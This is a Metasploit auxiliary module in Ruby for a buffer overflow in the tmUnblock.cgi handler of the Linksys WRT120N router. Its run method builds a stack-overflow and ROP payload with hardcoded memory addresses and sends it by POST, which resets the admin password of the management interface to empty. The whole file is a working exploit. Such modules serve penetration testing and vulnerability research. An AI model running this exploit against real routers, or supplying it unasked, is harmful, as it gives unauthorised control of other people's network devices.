##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Linksys WRT120N Buffer Overflow in tmUnblock - Password Reset',
      'Description'     => %q{
          This module exploits a buffer overflow vulnerability in the WRT120N Linksys router.
         It is possible to reset the password of the management interface temporarily to an
         empty value. It was tested on a WRT120N firmware version 1.0.07.
      },
      'Author'          =>
        [
          'Craig Heffner',  #original exploit
          'Michael Messner <devnull[at]s3cur1ty.de>'  #metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'EDB', '31758' ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 19 2014'))

    register_options(
      [
        Opt::RPORT(80),
      ], self.class)
  end

  def run
    uri = '/cgi-bin/tmUnblock.cgi'

    print_status("#{rhost}:#{rport} - Resetting password for the admin user ...")

    postdata = Rex::Text.rand_text_alpha(246)             # Filler
    postdata << "\x81\x54\x4A\xF0"                        # $s0, address of admin password in memory
    postdata << "\x80\x31\xF6\x34"                        # $ra
    postdata << Rex::Text.rand_text_alpha(40)             # Stack filler
    postdata << Rex::Text.rand_text_alpha(4)              # Stack filler
    postdata << "\x80\x34\x71\xB8"                        # ROP 1 $ra (address of ROP 2)
    postdata << Rex::Text.rand_text_alpha(8)              # Stack filler

    (0..3).each do |i|
      postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s0, don't care
      postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s1, don't care
      postdata << "\x80\x34\x71\xB8"                      # ROP 2 $ra (address of itself)
      postdata << Rex::Text.rand_text_alpha(4-(3*(i/3)))  # Stack filler
    end

    begin
      res = send_request_cgi(
        {
          'uri'    => uri,
          'method' => 'POST',
          'vars_post' => {
              'period' => '0',
              'TM_Block_MAC' => '00:01:02:03:04:05',
              'TM_Block_URL' => postdata
           }
        })
      return if res.nil?
      return if res.code == 404
      if res.code == 500
         print_status("Unknown exploiting status - try to login with user admin and no password")
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end
  end
end
